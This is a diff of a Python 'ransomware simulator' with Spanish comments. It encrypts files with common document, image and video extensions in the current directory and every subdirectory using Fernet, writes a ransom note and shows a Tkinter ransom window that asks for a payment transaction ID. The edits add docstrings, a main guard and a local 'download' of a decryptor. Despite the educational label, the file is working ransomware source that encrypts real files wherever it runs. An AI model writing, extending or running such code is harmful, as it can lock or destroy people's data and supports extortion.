@@ -32,32 +32,35 @@
 
 
 import os
+import shutil
 import tkinter as tk
 from tkinter import messagebox
 from cryptography.fernet import Fernet
-import webbrowser
 
 # === CONFIGURACIÓN ===
-EXTENSIONES_OBJETIVO = ['.txt', '.jpg', '.jpeg', '.png', '.docx', '.odt', '.ods', '.odp']
+
+EXTENSIONES_OBJETIVO = ['.txt', '.jpg', '.jpeg', '.png', '.mp4', '.docx', '.odt', '.ods', '.odp']
 ID_VICTIMA = "VICTIMA_893472"
-ID_VALIDO = "NUNCA_PAGAR"
-LINK_DESCARGA = "#"  # Enlace simulado
+ID_VALIDO = "pagado"
+LINK_DESCARGA = "../recursos/desencriptar"  # Ruta simulada (local)
 ARCHIVOS_EXCLUIDOS = [
     "ransomware_simulador.py",
     "desencriptar.py",
     ".clave.key",
-    ".README_RESCATE.txt"
+    "README_RESCATE.txt"
 ]
 
 # === FUNCIONES ===
 
 def generar_clave():
+    """Genera una clave Fernet y la guarda en un archivo."""
     key = Fernet.generate_key()
     with open(".clave.key", "wb") as f:
         f.write(key)
     return key
 
 def cifrar_archivos_en_directorio_actual(fernet):
+    """Cifra archivos del directorio actual y subdirectorios si tienen extensiones objetivo."""
     base_dir = os.path.abspath(".")
     for root, _, files in os.walk(base_dir):
         for nombre_archivo in files:
@@ -76,6 +79,7 @@ def cifrar_archivos_en_directorio_actual(fernet):
                     print(f"⚠️ Error con {ruta_completa}: {e}")
 
 def crear_nota_rescate():
+    """Crea el archivo de nota de rescate con instrucciones simuladas."""
     texto = f"""
 🛑 Tus archivos han sido cifrados 🛑
 
@@ -87,10 +91,11 @@ Para recuperarlos:
 
 (Esto es una simulación educativa, no se ha producido daño real)
 """
-    with open(".README_RESCATE.txt", "w") as f:
+    with open("README_RESCATE.txt", "w") as f:
         f.write(texto)
 
 def mostrar_interfaz_rescate():
+    """Muestra la interfaz gráfica donde se ingresa el ID de transacción y se simula la descarga."""
     def verificar():
         ingresado = entrada.get().strip()
         if ingresado == ID_VALIDO:
@@ -99,8 +104,24 @@ def mostrar_interfaz_rescate():
         else:
             messagebox.showerror("Error", "ID de transacción incorrecto.")
 
-    def descargar():
-        webbrowser.open(LINK_DESCARGA)
+    def descargar_archivo_local():
+        """Simula la descarga copiando el archivo desde un directorio local."""
+        destino = os.path.join(".", os.path.basename(LINK_DESCARGA))
+        try:
+            if not os.path.exists(LINK_DESCARGA):
+                messagebox.showerror("Error", f"❌ El archivo no existe en: {LINK_DESCARGA}")
+                return
+
+            tamaño_origen = os.path.getsize(LINK_DESCARGA)
+            shutil.copy(LINK_DESCARGA, destino)
+            tamaño_destino = os.path.getsize(destino)
+
+            if tamaño_origen != tamaño_destino:
+                raise ValueError("⚠️ El archivo copiado no coincide en tamaño con el original.")
+
+            messagebox.showinfo("Descarga completa", f"✅ Archivo descargado como: {destino}")
+        except Exception as e:
+            messagebox.showerror("Error", f"❌ No se pudo copiar el archivo:\n{e}")
 
     ventana = tk.Tk()
     ventana.title("Rescate de archivos")
@@ -116,16 +137,17 @@ def mostrar_interfaz_rescate():
 
     tk.Button(ventana, text="Verificar", command=verificar).pack(pady=5)
 
-    boton_descarga = tk.Button(ventana, text="Descargar herramienta", state="disabled", command=descargar)
+    boton_descarga = tk.Button(ventana, text="Descargar herramienta", state="disabled", command=descargar_archivo_local)
     boton_descarga.pack(pady=10)
 
     ventana.mainloop()
 
 # === EJECUCIÓN PRINCIPAL ===
 
-clave = generar_clave()
-fernet = Fernet(clave)
+if __name__ == "__main__":
+    clave = generar_clave()
+    fernet = Fernet(clave)
 
-cifrar_archivos_en_directorio_actual(fernet)
-crear_nota_rescate()
-mostrar_interfaz_rescate()
+    cifrar_archivos_en_directorio_actual(fernet)
+    crear_nota_rescate()
+    mostrar_interfaz_rescate()
